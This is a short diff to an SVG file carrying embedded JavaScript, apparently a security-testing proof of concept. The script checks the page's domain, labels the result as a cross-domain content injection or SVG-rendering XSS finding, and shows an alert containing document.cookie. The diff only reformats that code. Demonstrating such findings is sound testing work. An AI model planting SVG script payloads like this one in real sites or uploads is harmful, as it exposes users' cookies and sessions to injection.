@@ -5,8 +5,18 @@
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">
 	  var msg = "";
-	  if ("dev0011653.esri.com"===document.domain) {msg="\r\n\r\nFinding: Cross Domain Content Injection";} else {msg="\r\n\r\nFinding: XSS because the SVG content is rendering";}
-      alert('JavaScript alert from the following domain:' + document.domain + '\r\n' + 'Message:' + msg + '\r\n' + 'Cookie:' + document.cookie);
-	  	  
+	  if ("dev0011653.esri.com"===document.domain){
+	    msg="\r\n\r\nFinding: Cross Domain Content Injection";
+	  } 
+	  else {
+	    msg="\r\n\r\nFinding: XSS because the SVG content is rendering";
+	 }
+
+	  var alrt = '\r\n\r\nJavaScript alert from this domain:' + document.domain 
+	  alrt += '\r\n\r\nMessage:' + msg 
+	  alrt += '\r\n\r\nCookie:' + document.cookie
+	  alert(alrt);
+	  
+	  
    </script>
 </svg>
